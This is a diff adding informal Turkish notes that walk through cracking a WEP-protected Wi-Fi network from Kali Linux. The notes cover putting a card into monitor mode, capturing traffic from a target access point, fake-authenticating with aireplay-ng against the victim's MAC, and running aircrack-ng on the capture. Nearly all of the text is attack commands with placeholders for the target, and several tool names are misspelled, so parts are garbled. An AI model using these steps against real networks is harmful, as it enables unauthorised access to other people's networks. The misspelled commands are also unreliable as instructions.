@@ -1,0 +1,29 @@
+virtual box ağdan köprü bağdaştırıcısını seç
+başlat kaliyi
+ifcondigde wlan0 eth0 aktif görünüyor.
+---
+ilk olarak airmon -ng start wlan0 //--write derse yazabilirsin
+airodump-ng wlan0mon diyip akan paketleri sniff eth0
+cihazında bir ssidsi vardır(mac=modem)
+
+şifre türlerini görüyoruz.
+wep kolay kırılıyor
+yazalım...
+----
+airdup -ng --bssid (saldırılacak mci yaz) -c 8 --write engin wlan0mon
+
+bir istasyon şu anda bağlı görünüyor.
+frame sayısını arttırmamız lazımki rahat kırılabilsin
+---
+aircrak ypmalıyız
+aircrack-ng yaz
+aircrack-ng engin write yazdı
+
+failed.next try 5000 ıvs dedi
+wifile bağlandık olmadı
+.....
+sahte olarak bağlıymışız gibi ggösterelim
+airplay-ng  fakeauth 1000 -a (saldırılacak adresmac) -h (hostmac ()kendi macimiz(yeni pencereden öğrendik)) wlan0mon
+--
+yeni pencerede aircrack-ng engin-01.cap dedik
+--
